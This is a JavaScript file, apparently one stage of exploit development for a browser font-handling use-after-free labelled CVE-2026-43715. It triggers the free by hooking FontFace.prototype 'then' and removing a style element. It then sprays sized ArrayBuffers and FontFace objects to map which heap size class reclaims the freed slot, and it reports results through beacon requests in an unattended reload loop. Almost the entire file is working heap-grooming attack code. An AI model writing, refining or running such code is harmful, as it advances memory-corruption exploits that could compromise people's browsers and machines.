// p458 — CVE-2026-43715 Stage 2: heap class-map of the freed slot
// (AUTO-RELOAD LOOP — designed to run unattended 24/7)
// Beacon prefix: V458-
//
// Question this answers: what allocation size class does the freed
// FontFace wrapper slot live in? p446 showed raw ArrayBuffer bytes CAN
// claim the slot (dispatch death) — so a size-matched ArrayBuffer
// backing store and the wrapper share a FastMalloc class.
//
// Method: per run, insert exactly ONE filler allocation of size k
// between the free and the face spray (LIFO free list: a same-class
// first allocation claims the block). If flips survive -> k is outside
// the wrapper class. If the page dies -> the last K-GO beacon names
// the killer size = the wrapper's class. Sizes cycle via localStorage
// so a crash round doesn't lose the schedule on re-park.
//
// k=0 rounds are the p457 baseline (no filler) — they keep feeding the
// flip-position distribution.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V458-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  // v458d: p446's claiming spray included 320..1536 and the dense 8..256
  // sweep never claimed (25 cycles, zero kills) — so the freed slot's
  // class lives in 288..1536. Sweep that band: 16-byte steps to 512,
  // 32-byte steps to 1024, 64-byte steps to 1536.
  var SIZES = [0];
  for (var _i = 288; _i <= 512; _i += 16) SIZES.push(_i);
  for (var _i = 528; _i <= 1024; _i += 32) SIZES.push(_i);
  for (var _i = 1088; _i <= 1536; _i += 64) SIZES.push(_i);

  var k;
  try { k = parseInt(localStorage.getItem('p458k') || '0', 10) || 0; } catch(e) { k = 0; }
  var next = (SIZES.indexOf(k) + 1) % SIZES.length;
  try { localStorage.setItem('p458k', String(SIZES[next])); } catch(e) {}

  B('BOOT-k' + k);
  // visible heartbeat: a blank page is indistinguishable from a dead one
  var hb = document.createElement('pre');
  hb.id = 'hb';
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);
  hb.textContent = 'p458b ALIVE run k=' + k + ' boots=' + (parseInt(localStorage.getItem('p458boot') || '0', 10) + 1);
  try { localStorage.setItem('p458boot', String(parseInt(localStorage.getItem('p458boot') || '0', 10) + 1)); } catch(e) {}

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var jfaces = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        if (k > 0) {
          // one filler, exactly matching-size class candidates first:
          // LIFO means the first same-class allocation takes the slot.
          window.__filler = new ArrayBuffer(k);
        }
        for (var j = 0; j < 120; j++) {
          var ff = new FontFace('j' + j, BAD);
          document.fonts.add(ff);
          jfaces.push(ff);
        }
      }
      return undefined;
    },
    configurable: true
  });

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round0() {
    B('K' + k + '-GO');
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE-RELOAD'); setTimeout(reload, 2000); return; }

    void face.loaded;
    face.load().then(
      function() {
        var flipped = -1, others = 0;
        for (var j = 0; j < jfaces.length; j++) {
          var s;
          try { s = jfaces[j].status; } catch(e) { s = 'THROW'; }
          if (s === 'loaded') { flipped = j; }
          else if (s !== 'unloaded') { others++; }
        }
        B('F' + k + '-' + (flipped >= 0 ? 'FLIPPOS-' + flipped : 'NOFLIP'));
        var hbu = document.getElementById('hb');
        if (hbu) hbu.textContent = 'p458b k=' + k + ' -> ' + (flipped >= 0 ? 'FLIP@' + flipped : 'NOFLIP') + ' (reloading)';
        if (others) B('F' + k + '-ODDSTAT-' + others);
        setTimeout(reload, 2500);
      },
      function(e) { B('K' + k + '-NO-0-RELOAD'); setTimeout(reload, 2000); }
    );
  }

  function reload() {
    location.replace('fa-v458-classmap.html?r=' + Date.now());
  }

  round0();
  setTimeout(function() {
    B('WATCHDOG-RELOAD-k' + k);
    reload();
  }, 30000);
})();
